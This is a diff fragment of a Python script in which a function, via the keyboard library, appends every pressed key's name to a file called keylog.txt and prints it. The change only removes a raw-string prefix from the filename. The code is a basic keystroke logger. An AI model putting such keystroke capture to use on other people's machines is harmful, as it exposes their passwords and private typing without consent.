@@ -2,7 +2,7 @@ import time
 import keyboard
 
 def logger(event):
-    with open(r'keylog.txt', 'a') as keylog:
+    with open('keylog.txt', 'a') as keylog:
         keylog.write(event.name + '\n')
         print(event)
     # end with-as
